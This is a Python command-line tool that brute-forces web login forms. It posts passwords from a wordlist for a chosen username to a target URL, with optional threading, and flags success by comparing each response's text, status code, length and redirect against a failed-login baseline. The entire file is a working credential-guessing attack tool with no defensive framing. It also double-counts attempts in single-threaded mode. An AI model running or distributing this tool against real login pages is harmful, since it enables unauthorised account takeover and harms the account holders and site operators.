#!/usr/bin/env python3
import sys
import argparse
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from tabulate import tabulate
import subprocess

def parse_args():
    parser = argparse.ArgumentParser(description="HTTP Brute-Force Login Tool")
    parser.add_argument("-u", "--url", help="Target login URL")
    parser.add_argument("-U", "--username", help="Username to brute-force")
    parser.add_argument("-w", "--wordlist", help="Path to password wordlist")
    parser.add_argument("-m", "--mode", choices=["text", "code", "length", "all"], default="all", help="Detection mode")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--threads", type=int, default=1, help="Number of threads (default 1 - single-threaded)")
    parser.add_argument("--cred", help="Provide credentials in username:password format")
    return parser.parse_args()

def get_baseline(url, username):
    try:
        resp = requests.post(url, data={"username": username, "password": "invalid_password"}, timeout=5)
        return {
            "text": resp.text,
            "status_code": resp.status_code,
            "length": len(resp.content),
            "url": resp.url
        }
    except requests.RequestException as e:
        print(f"[!] Could not get baseline: {e}")
        sys.exit(1)

def is_password_correct(response, baseline, mode):
    if mode == "text":
        return response.text != baseline["text"]
    elif mode == "code":
        return response.status_code != baseline["status_code"]
    elif mode == "length":
        return len(response.content) != baseline["length"]
    elif mode == "all":
        return (
            response.text != baseline["text"] or
            response.status_code != baseline["status_code"] or
            len(response.content) != baseline["length"] or
            response.url != baseline["url"]
        )
    return False

def try_password(url, username, password, baseline, mode, verbose, found_event, attempt_lock, attempt_counter, result_holder):
    with attempt_lock:
        attempt_counter[0] += 1

    if found_event.is_set():
        return False
    try:
        response = requests.post(url, data={"username": username, "password": password}, timeout=5)
        correct = is_password_correct(response, baseline, mode)

        if verbose:
            print(f"[-] Tried: {password}")
            if mode == "all":
                table = [
                    ["Status Code", response.status_code, baseline['status_code']],
                    ["Content Length", len(response.content), baseline['length']],
                    ["Text Diff", 'DIFFERENT' if response.text != baseline['text'] else 'Same', 'Expected'],
                    ["Redirect URL", response.url, baseline['url']]
                ]
                print(tabulate(table, headers=["Check", "Response", "Baseline"]))

        if correct:
            print(f"\n[✅] Password found: {password}")
            result_holder["password"] = password
            found_event.set()
            return True
    except requests.RequestException as e:
        if not found_event.is_set():
            print(f"[!] Error trying {password}: {e}")
    return False

def main():
    args = parse_args()

    if args.threads > 10:
        print(f"[⚙️] Offloading to threaded engine (threads: {args.threads})...")
        command = [
            "python3", "modules/http_threader.py",
            "--url", args.url,
            "--username", args.username,
            "--wordlist", args.wordlist,
            "--mode", args.mode,
            "--threads", str(args.threads)
        ]
        if args.verbose:
            command.append("--verbose")
        subprocess.run(command)
        return

    if args.cred:
        if ":" not in args.cred:
            print("[!] Invalid format for --cred. Use username:password")
            sys.exit(1)
        cred_user, cred_pass = args.cred.split(":", 1)
        args.username = cred_user
        passwords = [cred_pass]
    else:
        if not all([args.url, args.username, args.wordlist]):
            print("[!] Missing required arguments. Use -u, -U, -w or --cred")
            sys.exit(1)
        try:
            with open(args.wordlist, 'r') as f:
                passwords = list(set([line.strip() for line in f if line.strip()]))
        except FileNotFoundError:
            print(f"[ERROR] Wordlist file '{args.wordlist}' not found.")
            sys.exit(1)

    print(f"[*] Starting HTTP brute-force on {args.url}")
    print(f"[*] Username: {args.username}")
    print(f"[*] Passwords Loaded: {len(passwords)}")
    print(f"[*] Detection mode: {args.mode}")
    print(f"[*] Threads: {args.threads}")
    print(f"[*] Verbose: {args.verbose}")
    print("-" * 50)

    baseline = get_baseline(args.url, args.username)
    found_event = threading.Event()
    attempt_counter = [0]
    attempt_lock = threading.Lock()
    result_holder = {"password": None}
    start_time = time.time()

    if args.threads > 1:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(
                    try_password, args.url, args.username, pw,
                    baseline, args.mode, args.verbose, found_event,
                    attempt_lock, attempt_counter, result_holder
                ): pw for pw in passwords
            }
            try:
                for future in as_completed(futures):
                    if future.result():
                        found_event.set()
                        break
            except KeyboardInterrupt:
                print("\n[!] Interrupted by user. Exiting...")
                found_event.set()
    else:
        try:
            for pw in passwords:
                with attempt_lock:
                    attempt_counter[0] += 1
                if try_password(args.url, args.username, pw, baseline, args.mode, args.verbose, found_event, attempt_lock, attempt_counter, result_holder):
                    break
        except requests.RequestException as e:
            print(f"[!] Error during brute-force: {e}")
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")

    end_time = time.time()
    elapsed = round(end_time - start_time, 2)

    print(f"\n[🔢] Total attempts: {attempt_counter[0]}")
    print(f"[⏱️] Time taken: {elapsed} seconds")

    if found_event.is_set():
        print(f"[🔐] Username: {args.username}")
        print(f"[🔓] Cracked Password: {result_holder['password']}")
        print("[🎉] Brute-force successful.")
    else:
        print("[-] Brute-force finished. Password not found.")

if __name__ == "__main__":
    main()
